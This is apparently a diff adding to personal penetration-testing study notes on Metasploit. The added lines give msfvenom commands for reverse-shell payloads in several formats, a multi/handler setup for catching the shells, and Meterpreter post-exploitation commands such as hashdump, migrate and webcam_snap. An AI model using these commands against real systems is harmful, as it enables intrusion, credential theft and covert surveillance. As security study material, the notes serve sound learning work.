@@ -61,4 +61,42 @@ Allows for the creation of payloads in different formats (dll, php, exe etc.) fo
 
 msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> -f raw -e php/base64 -> Create php payload, set the LHOST para for reverse_tcp & encode it w/ base64. Then the idea would be to delivery this payload somehow and get the user the activate
 
-With a payload created, delivered, and about to be executed, we need to catch the returned shell. This is normally done via the Exploit modules, but if we're making a stand-alone payload w/ venom, we need to catch the returned shell. This can be done w/ multihandlers.
+With a payload created, delivered, and about to be executed, we need to catch the returned shell. This is normally done via the Exploit modules, but if we're making a stand-alone payload w/ venom, we need to catch the returned shell. This can be done w/ multihandlers. For example:
+1) Create payload: msfvenom -p php/reverse.php LHOST=<IP> LPORT=<PORT> -f raw > file.php
+2) If you cat the file.php, you'll see the raw php code
+3) use exploit/multi/handler
+4) set payload <payload we created i.e. php/reverse_php>
+5) set lhost <IP> set lport <port> -> listening ports
+6) run
+7) Perform post-exploit 
+
+Additional payloads:
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<port> -f elf > rev_shell.elf  -> Linux exe. (remember +x perm.)
+msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<PORT> -f raw > revshell.py
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > rev_shell.exe
+
+#-----METERPRETER
+Basically specialized cmd & cntrl system that we can interact w/ w/ specialized cmds. It runs entirely in memory. Nothing is written to disk to avoid AV scanning. 
+Commmon commands are:
+
+help -> Will show options specific to your meterpreter session
+getuid -> Shows the user w/ which the meterpreter session is running under. May give you an idea regarding privledge lvl
+ps -> running processes. Helps for MIGRATION
+migrate <PID> -> Migrate to another process. May also allow for additional cmds depending on the process we migrate to. spoolsvc.exe or explorer are nice. Tpyically want x64 w/ SYSTEM
+hashdump -> dump ntlm hashes (local, not domain)
+search -> Search for a file on the target system
+shell -> Opens  a shell on the taget i.e. pwrshell, bash, cmd
+load <module> -> This can load additional tools into meterpreter
+getpid -> Gets current PID meterpreter is attached to. Migrate to a process w/ SYSTEM
+upload
+download
+screenshot
+webcam_snap
+pwd
+cat
+rm
+pkill
+shutdown
+sysinfo
+cd
+ls
